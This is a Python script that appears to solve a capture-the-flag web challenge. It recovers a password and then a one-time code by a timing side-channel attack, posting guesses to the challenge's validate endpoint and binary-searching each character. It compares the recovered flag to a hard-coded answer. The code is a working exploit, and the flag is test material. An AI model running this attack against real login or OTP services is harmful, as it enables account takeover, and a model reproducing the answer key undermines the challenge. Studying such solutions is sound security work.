import argparse
import time
import requests
import json


def binary_search_timing_attack(check_function, max_length):
    alphabet = [chr(i) for i in range(20,128)]
    mid = 0
    guess = ""
    current_duration = 0.25
    result = {
        "result": -1
    }

    while result != 0 and len(guess) < max_length:
        low = 0
        high = len(alphabet) - 1
        while low <= high:
            mid = (high + low) // 2
            char = alphabet[mid]
            print(f"Could have guessed from: {alphabet}")
            print(f"Trying {char}")
            start = time.time()
            print(f"checking {guess + char}")
            result = check_function(guess + char)
            duration = result["took"]

            if duration - (0.25 / 2) > current_duration:
                print(f"DUR OK {duration}, {duration - (0.25 / 2)}, {current_duration}")
                current_duration = duration
                guess += char
                break

            # If 'strcmp' return 1, ignore left half
            if result['result'] == 1:
                low = mid + 1

            # If 'strcmp' return -1, ignore right half
            elif result['result'] == -1:
                high = mid - 1
    if result['result'] != 0:
        return "Timeout: guessed password is too long"
    return guess


def _test_single_password(guess: str, full_response: bool = False):
    url = f'{BASE_URL}validate'
    headers = {'Content-Type': 'application/json'}

    # Sample data to be sent in the request body
    data = {'password': guess}

    # Convert Python dictionary to JSON string
    json_data = json.dumps(data)

    # Make the POST request
    response = requests.post(url, headers=headers, data=json_data)
    if full_response:
        return response
    return response.json()


def _test_single_otp(guess: str, full_response: bool = False):
    url = f'{BASE_URL}{GUID}'
    headers = {'Content-Type': 'application/json'}

    # Sample data to be sent in the request body
    data = {'otp': guess}

    # Convert Python dictionary to JSON string
    json_data = json.dumps(data)

    # Make the POST request
    response = requests.post(url, headers=headers, data=json_data)
    if full_response:
        return response
    return response.json()['result']


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Script with connection info.')
    parser.add_argument('--connection-info', help='Specify connection information')
    args = parser.parse_args()
    BASE_URL = args.connection_info.split(" ")[1]
    BASE_URL = f"http://{BASE_URL}:80/"
    pw = binary_search_timing_attack(_test_single_password, 99)
    GUID = _test_single_password(pw, full_response=True).json()['message']

    otp = binary_search_timing_attack(_test_single_otp, 12)
    flag = _test_single_otp(otp, full_response=True).json()['message']
    result = 0 if flag == "CSC{Al9ORi7hMic5_cLa22_Wa5_Co0L_aF73R_AlL}" else 1
    exit(result)
